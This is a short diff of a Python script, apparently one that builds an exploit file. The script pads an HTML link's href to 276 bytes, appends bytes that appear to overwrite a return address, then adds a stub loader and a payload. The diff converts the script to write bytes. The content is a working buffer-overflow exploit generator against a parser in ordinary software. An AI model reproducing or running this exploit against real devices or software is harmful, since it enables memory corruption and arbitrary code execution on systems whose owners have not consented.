@@ -44,8 +44,8 @@ file = open(sys.path[0] + "/ftlstub/build/ftlstub.ucl", "rb")
 ftlstub = file.read()
 file.close()
 
-exploit = "<a href=\"" + sys.argv[2].ljust(276) + "%34%05%64%08\">a</a>"
+exploit = ("<a href=\"" + sys.argv[2].ljust(276) + "%34%05%64%08\">a</a>").encode('ascii')
 
 file = open(sys.argv[3], "wb")
-file.write(exploit + ftlstub.ljust(4096 - len(exploit) - len(uclstub), "\0") + uclstub + payload)
+file.write(exploit + ftlstub.ljust(4096 - len(exploit) - len(uclstub), b"\0") + uclstub + payload)
 file.close()
